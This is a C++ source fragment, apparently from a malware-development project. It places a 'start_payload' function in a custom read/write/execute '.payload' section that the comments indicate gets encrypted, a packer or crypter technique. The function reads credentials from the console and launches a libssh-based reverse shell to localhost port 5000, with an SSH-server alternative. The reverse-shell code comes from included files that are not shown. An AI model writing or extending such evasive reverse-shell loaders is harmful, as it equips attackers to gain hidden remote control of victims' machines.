#include <libssh/libssh.h>
#include <windows.h>
#include "reverse-shell.cpp"
#include "server.cpp"
#include "stdlib.h"
#include "stdio.h"
#include "exception"

#pragma section(".payload", read, write, execute)
#pragma comment(linker, "/SECTION:.payload,ERW")
#pragma code_seg(".payload")

void print_whatever() {
	printf("mraow: %i\n", LIBSSH_VERSION_MICRO);
}

int start_payload(int argc, const char *argv[]) {
	// has to be explcititly called when statically linking
	if (ssh_init()) {
		throw std::exception("failed to init ssh package");
	}

	try {
		if (true) {
			std::string username;
			std::string password;
			
			std::cout << "username: ";
			std::cin >> username;
			std::cout << "password: ";
			std::cin >> password;

			auto shell = ReverseShell("localhost", username.c_str());
			shell.Connect(5000, password.c_str());
		} else {
			auto server = SSHServer("localhost", 6000);
			server.start();
		}
	} catch (std::exception &err) {
		std::cerr << "SSH loop failed: " << err.what() << "\n";
		exit(1);
	}

	// has to be called when ssh_init is explicitly called
	if (ssh_finalize()) {
		throw std::exception("failed to de-init ssh package");
	}

	return 0;
}

// seemingly doesnt automatically get set back to .text
// without this line, a bunch of builtin functions get encrypted and prevent the program from launching properly
#pragma code_seg(".text")